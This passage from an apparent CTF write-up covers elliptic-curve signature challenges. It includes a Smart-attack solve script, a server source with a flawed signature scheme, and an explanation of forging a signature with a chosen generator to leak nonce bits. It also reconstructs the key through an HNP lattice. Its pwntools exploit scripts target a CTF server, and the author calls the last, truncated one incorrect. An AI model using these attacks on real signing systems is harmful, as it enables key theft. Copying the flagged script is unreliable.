class="line">    io.recvuntil(<span class="string">b&quot;context: &quot;</span>)</span><br><span class="line">    io.sendline(ctx1.<span class="built_in">hex</span>().encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;sign: &quot;</span>)</span><br><span class="line">    r1 = Integer(io.recvuntil(<span class="string">b&quot;\n&quot;</span>).strip().decode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;ature: &quot;</span>)</span><br><span class="line">    s1 = Integer(io.recvuntil(<span class="string">b&quot;\n&quot;</span>).strip().decode())</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;context: &quot;</span>)</span><br><span class="line">    io.sendline(ctx2.<span class="built_in">hex</span>().encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;sign: &quot;</span>)</span><br><span class="line">    r2 = Integer(io.recvuntil(<span class="string">b&quot;\n&quot;</span>).strip().decode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;ature: &quot;</span>)</span><br><span class="line">    s2 = Integer(io.recvuntil(<span class="string">b&quot;\n&quot;</span>).strip().decode())</span><br><span class="line"></span><br><span class="line">    P1 = E.lift_x(r1)</span><br><span class="line">    k1 = smart_attack(G, P1)</span><br><span class="line"></span><br><span class="line">    P2 = E.lift_x(r2)</span><br><span class="line">    k2 = smart_attack(G, P2)</span><br><span class="line"></span><br><span class="line">    invk1 = inverse(k1, n)</span><br><span class="line">    invk2 = inverse(k2, n)</span><br><span class="line"></span><br><span class="line">    r1_r2 = r1 - r2</span><br><span class="line">    priv = inverse(r1_r2, n) * (s1 * k1 - s2 * k2) % n</span><br><span class="line"></span><br><span class="line">    r, s = solve2(priv, <span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;signature: &quot;</span>)</span><br><span class="line">    sig = <span class="string">f&quot;<span class="subst">&#123;r&#125;</span> <span class="subst">&#123;s&#125;</span>&quot;</span>.encode()</span><br><span class="line">    io.sendline(sig)</span><br><span class="line">    flag = io.recvline()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="comment"># flag&#123;good_job_k33p_g01n9_for_level_3__Ef7uNwoN&#125;</span></span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> fastecdsa.curve</span><br><span class="line"><span class="keyword">import</span> fastecdsa.point</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> alarm</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line">FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;XXX_FAKE_FLAG_XXX&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Server</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.generate_key()</span><br><span class="line">        alarm(<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.proof_of_work():</span><br><span class="line">            exit()</span><br><span class="line">        <span class="variable language_">self</span>.service()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Login</span>(<span class="params">self, pk</span>):</span><br><span class="line">        username = <span class="built_in">input</span>(<span class="string">&quot;username: &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;jqctf@root&quot;</span>:</span><br><span class="line">            Gx = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;Gimme the Gx: &quot;</span>))</span><br><span class="line">            Gy = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;Gimme the Gy: &quot;</span>))</span><br><span class="line">            sig = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;Gimme ur signature: &quot;</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.verify(username, sig, [Gx, Gy], pk):</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Some Error...&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;user does not exists...&quot;</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_key</span>(<span class="params">self</span>):</span><br><span class="line">        curve = fastecdsa.curve.secp256k1</span><br><span class="line">        d = random.randrange(<span class="number">1</span>, curve.q)</span><br><span class="line">        P = curve.G * d</span><br><span class="line">        pk = [P.x.to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>), P.y.to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line">        sk = [d.to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;key.pub&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pickle.dump(pk, f)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;key.priv&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pickle.dump(sk, f)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_key</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;key.pub&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pk = pickle.load(f)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;key.priv&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            sk = pickle.load(f)</span><br><span class="line">        <span class="keyword">return</span> pk, sk</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">self, x, g, pk</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">str</span>):</span><br><span class="line">            x = x.encode()</span><br><span class="line">        h = sha256(x)</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> g:</span><br><span class="line">            h.update(y.encode() <span class="keyword">if</span> <span class="built_in">isinstance</span>(y, <span class="built_in">str</span>) <span class="keyword">else</span> y)</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> pk:</span><br><span class="line">            h.update(y.encode() <span class="keyword">if</span> <span class="built_in">isinstance</span>(y, <span class="built_in">str</span>) <span class="keyword">else</span> y)</span><br><span class="line">        <span class="keyword">return</span> h.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, msg, sk, pk</span>):</span><br><span class="line">        curve = fastecdsa.curve.secp256k1</span><br><span class="line">        n = curve.q</span><br><span class="line">        d = <span class="built_in">int</span>(sk[<span class="number">0</span>].<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">        G = curve.G</span><br><span class="line">        g = [G.x.to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>), G.y.to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line">        e = <span class="built_in">int</span>(<span class="variable language_">self</span>.<span class="built_in">hash</span>(msg, g, pk), <span class="number">16</span>)</span><br><span class="line">        k = random.randrange(<span class="number">1</span>, n)</span><br><span class="line">        R = k * G</span><br><span class="line">        r = (e + R.x) % n</span><br><span class="line">        s = (inverse(d + <span class="number">1</span> , n) * (r + k) - r) % n</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(r).to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>) + <span class="built_in">int</span>(s).to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>), k</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, msg, sig, g, pk</span>):</span><br><span class="line">        curve = fastecdsa.curve.secp256k1</span><br><span class="line">        n = curve.q</span><br><span class="line">        G = fastecdsa.point.Point(</span><br><span class="line">            <span class="built_in">int</span>.from_bytes(g[<span class="number">0</span>], <span class="string">&#x27;big&#x27;</span>),</span><br><span class="line">            <span class="built_in">int</span>.from_bytes(g[<span class="number">1</span>], <span class="string">&#x27;big&#x27;</span>),</span><br><span class="line">            curve</span><br><span class="line">        )</span><br><span class="line">        P = fastecdsa.point.Point(</span><br><span class="line">            <span class="built_in">int</span>.from_bytes(pk[<span class="number">0</span>], <span class="string">&#x27;big&#x27;</span>),</span><br><span class="line">            <span class="built_in">int</span>.from_bytes(pk[<span class="number">1</span>], <span class="string">&#x27;big&#x27;</span>),</span><br><span class="line">            curve</span><br><span class="line">        )</span><br><span class="line">        r = <span class="built_in">int</span>(sig[:<span class="number">32</span>].<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">        s = <span class="built_in">int</span>(sig[<span class="number">32</span>:].<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt; r &lt; n <span class="keyword">and</span> <span class="number">0</span> &lt; s &lt; n <span class="keyword">and</span> (r + s) % n != <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        e = <span class="built_in">int</span>(<span class="variable language_">self</span>.<span class="built_in">hash</span>(msg, g, pk), <span class="number">16</span>)</span><br><span class="line">        Q = s * G + (r + s) * P</span><br><span class="line">        <span class="keyword">return</span> r == (Q.x + e) % n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">service</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.pk, <span class="variable language_">self</span>.sk = <span class="variable language_">self</span>.load_key()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;server pk: &quot;</span>, <span class="variable language_">self</span>.pk)</span><br><span class="line">        msg = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;ur msg (hex): &#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> msg == <span class="string">&quot;jqctf@root&quot;</span>: <span class="keyword">return</span></span><br><span class="line">        sig, k = <span class="variable language_">self</span>.sign(msg, <span class="variable language_">self</span>.sk, <span class="variable language_">self</span>.pk)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ur signature (hex): &#x27;</span>, sig.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.Login(<span class="variable language_">self</span>.pk):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Oh admin, value k here (hex): &quot;</span>, k.to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>).<span class="built_in">hex</span>()[:<span class="number">16</span>])</span><br><span class="line">        d = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">f&quot;Give me d (hex): &quot;</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> d != <span class="built_in">int</span>(<span class="variable language_">self</span>.sk[<span class="number">0</span>].<span class="built_in">hex</span>(), <span class="number">16</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Wrong d!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Congratulations! Here is your flag:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(FLAG)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">self</span>):</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(ascii_letters + digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        digest = sha256(proof.encode(<span class="string">&#x27;latin-1&#x27;</span>)).hexdigest()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;sha256(XXXX + &#123;&#125;) == &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(proof[<span class="number">4</span>: ], digest))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">        x = <span class="built_in">input</span>()</span><br><span class="line">        <span class="keyword">if</span> x != proof[: <span class="number">4</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">Server()</span><br></pre></td></tr></table></figure>

<p>对于本题，是一个ecdsa签名，可以发现sign的构造和传统的签名算法不同，因此考虑从sign入手。</p>
<p>首先，题目生成一对公私钥，并把公钥pk发给用户，用户如果发送msg给服务端，会返回sig</p>
<blockquote>
<p>这里题目中其实是msg &#x3D;&#x3D; “jqctf@root”，但是msg的类型是bytes，因此永远不可能相等，也就是永远不会退出程序，此时只需要直接发送jqctf@root的十六进制字符串，6a7163746640726f6f74，就可以直接获得jqctf@root的sig，这是非预期获得了sig进而登录获得k_high</p>
</blockquote>
<p>然后进入登录功能，需要用户输入username&#x3D;&#x3D;”jqctf@root”，再输入自定义的G.x和G.y，并提供username对应的sig，verify(username, sig, [Gx, Gy], pk)验证，注意，此时的G可自己构造，pk则是用之前生成的。此处就是本题的漏洞了。</p>
<p>对于sign(self, msg, sk, pk)，可知</p>
<p>$$s&#x3D;(r+k)<em>(d+1)^{-1}-r \mod n\ k\equiv (r+s)</em>(d+1)-r \mod n\ r&#x3D;e+R.x&#x3D; e+(k<em>G).x&#x3D; e+((r+s)</em>(P+G)-r*G).x \mod n\$$</p>
<p>而对于verify(self, msg, sig, g, pk)，G’则是利用用户在login传入的点g&#x3D;[Gx, Gy]构造的，而不是sign中的G。sig需要验证的内容如下</p>
<p>$$Q &#x3D; s * G^{\prime} + (r^{\prime} + s^{\prime}) * P\ 验证：r^{\prime} &#x3D;&#x3D; (Q.x + e) \mod n$$</p>
<p>我们需要伪造r’和s‘，并通过验证。令G’&#x3D;-2P，则有</p>
<p>$$Q&#x3D;(r^{\prime} - s^{\prime}) * P$$</p>
<p>再令r’-s’&#x3D;1，则有</p>
<p>$$Q&#x3D;P$$</p>
<p>此时验证等式右侧未知数已全部消掉，那么也就是需要构造等式右侧的r’值为</p>
<p>$$r^{\prime}&#x3D;(P.x + e) \mod n$$</p>
<p>s‘值为r’-1，即可成功伪造jqctf@root的sig，拿到k_high（高64位）。</p>
<p>题目有点问题，应该是生成固定的一组pk、sk，然后循环交互，拿多组k_high</p>
<p>$$k_{high}<em>2^{192}+k_{low}\equiv (r+s)</em>(d+1)-r&#x3D;(r+s)*d+s \mod n\ k_{low_i}\equiv (r_i+s_i)*d+(s_i-k_{high_i}*2^{192}) \mod n\ 令A&#x3D;(r_i+s_i)\mod n,B &#x3D;s_i-k_{high_i}<em>2^{192}\mod n\ k_{low_i}\equiv A_i</em>d+B_i \mod n\$$</p>
<p>那么就可以构造格</p>
<p>$$M&#x3D;\left[\begin{array}{cccccc} n &amp; &amp; &amp; &amp; &amp; \ &amp; n &amp; &amp; &amp; &amp; \ &amp; &amp; \ddots &amp; &amp; &amp; \ &amp; &amp; &amp; n &amp; &amp; \ A_1 &amp; A_2 &amp; \cdots &amp; A_n &amp; 2^{192} &#x2F; n &amp; \ B_1 &amp; B_2 &amp; \cdots &amp; B_n &amp; 0 &amp; 2^{192} \end{array}\right]$$</p>
<p><a target="_blank" rel="noopener" href="https://hasegawaazusa.github.io/ecdsa-note.html?highlight=ecdsa#hnp">ecdsa 笔记 | 独奏の小屋</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/581146119">HNP 一类基于各种DSA的HNP问题求解 - 知乎</a></p>
<p>以下官方题解有误，老师去问了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> fastecdsa.curve</span><br><span class="line"><span class="keyword">import</span> fastecdsa.point</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span>  alarm</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"></span><br><span class="line">table = ascii_letters + digits</span><br><span class="line">c = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">rr = [<span class="number">0</span>] * c</span><br><span class="line">ss = [<span class="number">0</span>] * c</span><br><span class="line">pool = [<span class="number">0</span>] * c</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof_of_work</span>():</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;sha256(XXXX + &quot;</span>)</span><br><span class="line">        suffix = io.recv(<span class="number">16</span>).decode()</span><br><span class="line">        io.recvuntil(<span class="string">b&quot; == &quot;</span>)</span><br><span class="line">        res = io.recv(<span class="number">64</span>).decode()</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">            hashresult = hashlib.sha256((x+suffix).encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> hashresult == res:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">list</span>(product(table, repeat=<span class="number">4</span>)):</span><br><span class="line">            prefix = <span class="string">&#x27;&#x27;</span>.join(item)</span><br><span class="line">            <span class="keyword">if</span> f(prefix):</span><br><span class="line">                io.sendline(prefix.encode())</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found prefix: <span class="subst">&#123;prefix&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">x, g, pk</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">str</span>):</span><br><span class="line">            x = x.encode()</span><br><span class="line">        h = sha256(x)</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> g:</span><br><span class="line">            h.update(y.encode() <span class="keyword">if</span> <span class="built_in">isinstance</span>(y, <span class="built_in">str</span>) <span class="keyword">else</span> y)</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> pk:</span><br><span class="line">            h.update(y.encode() <span class="keyword">if</span> <span class="built_in">isinstance</span>(y, <span class="built_in">str</span>) <span class="keyword">else</span> y)</span><br><span class="line">        <span class="keyword">return</span> h.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># io = process([&#x27;python3&#x27;, &#x27;task.py&#x27;])</span></span><br><span class="line">    io = remote(<span class="string">&quot;39.106.16.204&quot;</span>,<span class="string">&quot;26185&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    proof_of_work()</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;server pk: &quot;</span>)</span><br><span class="line">    pk = <span class="built_in">eval</span>(io.recvline().strip())</span><br><span class="line">    curve = fastecdsa.curve.secp256k1</span><br><span class="line">    n = curve.q</span><br><span class="line">    P = fastecdsa.point.Point(x = <span class="built_in">int</span>(pk[<span class="number">0</span>].<span class="built_in">hex</span>(), <span class="number">16</span>),y = <span class="built_in">int</span>(pk[<span class="number">1</span>].<span class="built_in">hex</span>(), <span class="number">16</span>), curve = curve)</span><br><span class="line">    G = <span class="built_in">int</span>(-<span class="number">2</span>)*P</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;ur msg (hex): &quot;</span>, <span class="string">b&quot;1231&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;ur signature (hex): &#x27;</span>)</span><br><span class="line">    rs = io.recvline().decode().strip()</span><br><span class="line">    rr[<span class="built_in">id</span>] = <span class="built_in">int</span>(rs[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span class="line">    ss[<span class="built_in">id</span>] = <span class="built_in">int</span>(rs[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Server signature: <span class="subst">&#123;rs&#125;</span>&quot;</span>)</span><br><span class="line">    e = <span class="built_in">int</span>(<span class="built_in">hash</span>(<span class="string">&quot;jqctf@root&quot;</span>, [G.x.to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>), G.y.to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>)] ,pk), <span class="number">16</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;username: &#x27;</span>, <span class="string">b&quot;jqctf@root&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Gimme the Gx: &quot;</span>, G.x.to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>).<span class="built_in">hex</span>().encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Gimme the Gy: &quot;</span>, G.y.to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>).<span class="built_in">hex</span>().encode())</span><br><span class="line">    r = (e + P.x) % n</span><br><span class="line">    s = (r + <span class="number">1</span>) % n</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Gimme ur signature: &quot;</span>, (<span class="built_in">int</span>(r).to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>) + <span class="built_in">int</span>(s).to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>)).<span class="built_in">hex</span>().encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Oh admin, value k here (hex): &quot;</span>)</span><br><span class="line">    k = <span class="built_in">int</span>(io.recvline().strip().decode(), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Value k: <span class="subst">&#123;k&#125;</span>&quot;</span>)</span><br><span class="line">    pool[<span class="built_in">id</span>] = k</span><br><span class="line">    <span class="built_in">print</span>(io.recvuntil(<span class="string">b&quot;Give me d (hex): &quot;</span>))</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(pool)</span><br><span class="line">    B = <span class="number">2</span>**<span class="number">192</span></span><br><span class="line">    C = <span class="number">2</span>**(<span class="number">256</span>-<span class="number">192</span>)</span><br><span class="line">    L = matrix(ZZ, c+<span class="number">2</span>)</span><br><span class="line">    L[<span class="number">0</span>, <span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    L[<span class="number">1</span>, <span class="number">1</span>] = B*C</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span 